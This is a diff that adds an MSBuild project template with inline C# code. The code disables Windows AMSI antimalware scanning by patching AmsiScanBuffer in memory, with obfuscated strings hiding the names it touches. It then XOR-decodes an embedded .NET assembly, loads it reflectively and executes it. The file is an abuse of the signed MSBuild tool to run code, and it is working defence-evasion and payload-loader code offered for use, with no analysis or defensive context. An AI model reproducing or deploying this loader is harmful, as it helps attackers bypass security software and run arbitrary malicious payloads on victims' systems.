@@ -1,0 +1,112 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="executor">
+   <executor/>
+  </Target>
+  <UsingTask
+    TaskName="executor"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+  <Task>
+    <Reference Include="System.Management.Automation"/>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.IO;
+        using System.Reflection;
+        using System.Text;
+        using System.Runtime.InteropServices;
+
+        namespace Stub {
+          class Program {
+            [DllImport("ke" + "rne" + "l32")]
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("ke" + "rne" + "l32")]
+            private static extern IntPtr LoadLibrary(string name);
+
+            [DllImport("ke" + "rne" + "l32")]
+            private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            [DllImport("user32.dll")]
+            public static extern bool SetProcessDPIAware();
+
+            private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0) {
+              Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
+            }
+            private static string Bypass() {
+              try {
+                var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
+                IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
+                uint magicValue = 0x40;
+                uint someNumber = 0;
+
+                if (System.Environment.Is64BitOperatingSystem) {
+                  var bigBoyBytes = new byte[] {
+                    0xB8,
+                    0x57,
+                    0x00,
+                    0x07,
+                    0x80,
+                    0xC3
+                  };
+
+                  VirtualProtect(addr, (UIntPtr) bigBoyBytes.Length, magicValue, out someNumber);
+                  CopyData(bigBoyBytes, addr);
+                } else {
+                  var smallBoyBytes = new byte[] {
+                    0xB8,
+                    0x57,
+                    0x00,
+                    0x07,
+                    0x80,
+                    0xC2,
+                    0x18,
+                    0x00
+                  };
+
+                  VirtualProtect(addr, (UIntPtr) smallBoyBytes.Length, magicValue, out someNumber);
+                  CopyData(smallBoyBytes, addr);
+
+                }
+                return "[+] Succesfully bypass AMSI.";
+              } catch (Exception ex) {
+                return "[-] Failed to bypass AMSI.";
+              }
+            }
+
+            private static byte[] Zor(byte[] input, byte[] key) {
+              byte[] mixed = new byte[input.Length];
+              for (int i = 0; i < input.Length; i++) {
+                mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
+              }
+              return mixed;
+            }
+            public static void Main(string[] args) {
+              Assembly asmb = null;
+              string stdout_path = Environment.GetEnvironmentVariable("TEMP") + "\\{{ random_string }}.txt";
+              StreamWriter stdout = File.AppendText(stdout_path);
+              stdout.AutoFlush = true;
+              Console.SetOut(stdout);
+              stdout.WriteLine(Bypass());
+              SetProcessDPIAware();
+              asmb = Assembly.Load(Zor(Convert.FromBase64String("{{ csharp_bin | safe }}"), Encoding.UTF8.GetBytes("{{ random_string }}")));
+              stdout.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
+              asmb.EntryPoint.Invoke(null, new object[] {
+                args
+              });
+            }
+          }
+          public class executor: Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {
+            public override bool Execute() {
+              Program.Main(new string[] {
+                  {{ arguments | safe }}
+              });
+              return true;
+            }
+          }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
